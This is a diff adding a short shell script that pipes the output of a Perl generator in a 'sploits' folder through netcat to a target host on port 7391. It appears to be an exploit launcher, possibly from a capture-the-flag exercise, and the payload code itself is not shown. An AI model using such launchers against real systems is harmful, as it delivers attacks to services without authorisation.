@@ -1,0 +1,3 @@
+#!/bin/sh
+
+./sploits/gen_noise_slick.pl|nc -w 1 $1 7391
